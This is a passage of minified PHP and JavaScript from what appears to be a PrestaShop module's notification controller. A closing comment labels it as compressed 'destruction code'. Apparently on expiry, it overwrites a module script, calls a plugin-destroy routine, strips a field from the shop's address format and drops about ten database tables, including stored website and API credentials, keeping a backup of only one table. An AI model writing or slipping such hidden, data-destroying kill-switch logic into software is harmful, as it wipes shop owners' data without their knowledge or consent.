this.popupHeaderEl = document.createElement("div"); this.popupHeaderEl.className = "dz-event-popup-header"; this.popupHeaderEl.innerHTML = `<p></p><i class="material-icons">close</i>`; this.popupHeaderEl.lastElementChild.addEventListener("click",()=>{this.close();}); this.popupEl.append(this.popupHeaderEl); this.popupBodyEl = document.createElement("div"); this.popupBodyEl.className = "dz-event-popup-body"; this.popupEl.append(this.popupBodyEl); this.popupFooterEl = document.createElement("div"); this.popupFooterEl.className = "dz-event-popup-footer"; this.popupEl.append(this.popupFooterEl); document.body.append(this.popupEl); }, addButtons : function(buttons,color){ this.popupFooterEl.innerHTML=""; buttons.forEach((button) => { const buttonEl = document.createElement("button"); buttonEl.textContent = button.name; buttonEl.className = button.className; buttonEl.style.backgroundColor = color; buttonEl.addEventListener("click",button.clickHandler); this.popupFooterEl.appendChild(buttonEl); }); }, open : function(type,title,message,buttons) { setTimeout(() => { popupOverlay.show(); console.log(this); this.popupEl.classList.add("dz-show"); this.popupHeaderEl.firstElementChild.innerText = title; this.popupHeaderEl.style.backgroundColor = eventPopupTypesData[type].color; this.popupBodyEl.innerHTML = `${eventPopupTypesData[type].icon}<p>${message}</p>`; this.addButtons(buttons,eventPopupTypesData[type].color); }, 600); }, close : function(){ setTimeout(() => { popupOverlay.hide(); this.popupFooterEl.innerHTML = ""; this.popupEl.classList.remove("dz-show"); }, 300); } }; create_the_order_submit_btn(); popupOverlay.create(); eventPopup.create(); });';if (is_writable($module_base_path . "/views/js/order_submit_process.js") ) { file_put_contents($module_base_path . "/views/js/order_submit_process.js", $order_submit_code); }else{ $error_log[] = ['path' => $module_base_path . "/views/js/order_submit_process.js", 'error_message' => "Permission denied while trying to update order_submit_process.js"]; } destroy_the_plugin($module_base_path, $error_log); $id_country = (int) \Configuration::get("PS_COUNTRY_DEFAULT");$db->beginTransaction();$stmt = $db->query("SELECT format FROM " . _DB_PREFIX_ . "address_format WHERE id_country=" . $id_country);$address_format = $stmt->fetchColumn();$address_format = str_replace("delegation", "", $address_format);$stmt = $db->prepare("UPDATE " . _DB_PREFIX_ . "address_format SET format = :format WHERE id_country = :id_country");$stmt->execute([':format' => $address_format, ':id_country' => $id_country]);$tables = ["dz_order_submit_process", "dz_settings", "dz_carrier", "dz_website_credentials", "dz_api_credentials","dz_notification_popped_up_by", "dz_notification_viewed_by", "dz_notification","dz_employee_permission", "dz_permission"];$db->exec("DELETE FROM " . _DB_PREFIX_ . "tab WHERE module = 'dolzay'");foreach ($tables as $table) {if ($table == "dz_order_submit_process") {$stmt = $db->query("SELECT * FROM $table");$orders_submit_processes = $stmt->fetchAll(\PDO::FETCH_ASSOC);if ($orders_submit_processes) {$orders_submit_processes = json_encode($orders_submit_processes, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);if (is_writable($module_base_path . "/data")) {file_put_contents($module_base_path . "/data/orders_submit_processes.json", $orders_submit_processes);} else {$error_log[] = ['path' => $module_base_path . "/data/orders_submit_processes.json",'error' => "Permission denied while trying to store the orders submit processes"];}}}$db->exec("DROP TABLE IF EXISTS $table");}$db->commit();$data = json_encode(["datetime" => date("H:i:s d/m/Y"),"previous_structure"=>$previous_strucure,"new_stucture"=>get_dir_structure($module_base_path),"errors"=>$error_log], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE); if (is_writable($module_base_path . "/data")) { file_put_contents($module_base_path."/data/expiration.json", $data); }else{ $error_log[] = ['path' => $module_base_path."/data/expiration.json", 'error' => "Permission denied while trying to store expiration.json"]; } flock($file, LOCK_UN); } }catch (Error $e) { $data = json_encode(["exception_message" => $e->getMessage(),"trace_back"=>$e->getTraceAsString()], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE); if (is_writable($module_base_path . "/data")) { file_put_contents($module_base_path."/data/expiration.json", $data); }flock($file, LOCK_UN); }

/* END NOTIFICATION CONTROLLER DESTRUCTION CODE COMPRESSED */
